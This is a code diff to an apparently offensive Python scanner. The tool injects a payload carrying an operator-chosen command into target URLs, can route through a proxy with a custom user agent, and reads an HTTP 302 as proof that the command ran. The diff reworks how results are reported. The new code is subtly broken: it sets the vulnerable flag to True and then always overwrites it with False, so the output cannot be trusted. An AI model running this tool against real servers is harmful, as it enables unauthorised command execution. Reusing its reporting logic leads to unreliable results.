@@ -56,15 +56,18 @@ def get_page(url, payload, proxy=None, user_agent=None):
     session.proxies = {"http": proxy, "https": proxy}
     session.headers["User-Agent"] = user_agent
     payloaded_url = "{}{}".format(url, payload)
+    print payloaded_url
+    retval = {"host": url, "injection point": payloaded_url}
     try:
         req = session.get(payloaded_url, verify=False, timeout=5)
         time.sleep(1.7)  # need to sleep to give execution time to run
         status = req.status_code
         if status == 302:
-            return True
-        return False
+            retval["is vulnerable"] = True
+        retval["is vulnerable"] = False
     except Exception:
-        return False
+        retval["is vulnerable"] = False
+    return retval
 
 
 def convert_url(host):
@@ -151,11 +154,19 @@ def boxxy(text):
     print("\n".join(res))
 
 
+def configure_results(results):
+    print("\nHost: {}\nExecuted URL: {}\nVulnerable: {}\n".format(
+        results["host"],
+        results["injection point"] if results["is vulnerable"] else "n/a",
+        "Yes" if results["is vulnerable"] else "No"
+    ))
+
+
 def main():
     """
     main function
     """
-    boxxy("\n-Author: {}\n--Twitter: {}\n---Description: {}\n\n".format(__author__, __twitter__, __description__))
+    boxxy("-Author: {}\n--Twitter: {}\n---Description: {}\n".format(__author__, __twitter__, __description__))
     print("\n")
     opts = Parser().optparse()
     arguments = check_opts(opts)
@@ -171,10 +182,7 @@ def main():
         host = "{}{}".format(host, arguments["path"])
         payload = create_payload(arguments["command"])
         results = get_page(host, payload, proxy=arguments["proxy"], user_agent=arguments["agent"])
-        if results:
-            print("[+] host: '{}' is likely vulnerable\n".format(host))
-        else:
-            print("[x] host: '{}' is likely NOT vulnerable\n".format(host))
+        configure_results(results)
 
 
 if __name__ == "__main__":
